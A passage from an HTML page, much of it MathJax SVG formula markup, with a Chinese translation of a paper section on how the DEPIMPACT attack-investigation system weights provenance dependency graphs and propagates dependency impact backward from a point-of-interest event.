280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(499,289) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(743.5,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1410.5,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1895.5,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2467.5,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(2828.5,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(3305.5,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(3790.5,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4135.5,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4735.5,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(5212.5,0)"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(5976.5,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(6496.5,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(6973.5,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(7439.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7828.5,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(8400.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mi" transform="translate(12265.3,0)"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(13313.3,0)"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(499,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g><g data-mml-node="TeXAtom" transform="translate(499,-247) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mi" transform="translate(767,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(15032.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(15421.5,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(15921.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 背后的基本原理是确保对于每个节点，所有出边的权重都在 [0.0,1.0]范围内，并且权重之和等于1.0。结合我们的依赖影响分数传播方案（第4.3节），这种规范化方式确保（1）任何节点的依赖影响不超过其子节点的最大依赖影响，以及（2）任何节点的依赖影响节点不超过POI事件的节点的依赖影响（即1.0）。第二阶段的输出是POI事件的加权后向依赖图，其中依赖权重对关键边和非关键边之间的差异进行编码。</p><h3 id="识别">4.3 识别</h3><p>第3阶段，给定第2阶段计算的加权依赖图，DEPIMPACT根据依赖权重将依赖影响从 POI 事件传播到入口节点。 DEPIMPACT然后根据依赖影响对入口节点进行排名，并从排名靠前的入口节点执行正向分析，以从依赖图中识别关键组成部分。</p><h4 id="依赖影响反向传播">4.3.1 依赖影响反向传播</h4><p>给定一个加权依赖图，DEPIMPACT将依赖影响从POI事件沿加权边向后传播到所有其他节点。POI事件中节点（包括源节点和目的节点）的依赖影响默认为1.0。对于节点u，其依赖影响通过对其子节点的依赖影响加权求和和进行迭代更新：<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -3.222ex;" xmlns="http://www.w3.org/2000/svg" width="34.677ex" height="5.371ex" role="img" focusable="false" viewBox="0 -950 15327.4 2374.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="msub" transform="translate(828,0)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2033.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munder" transform="translate(3089,0)"><g data-mml-node="mo" transform="translate(1930.4,0)"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(0,-1147.3) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(485,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(1585,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(2161,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2506,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(2804,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(3324,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mi" transform="translate(4212,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4697,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(5217,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(5683,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(6152,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6541,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7113,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mi" transform="translate(8560.4,0)"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 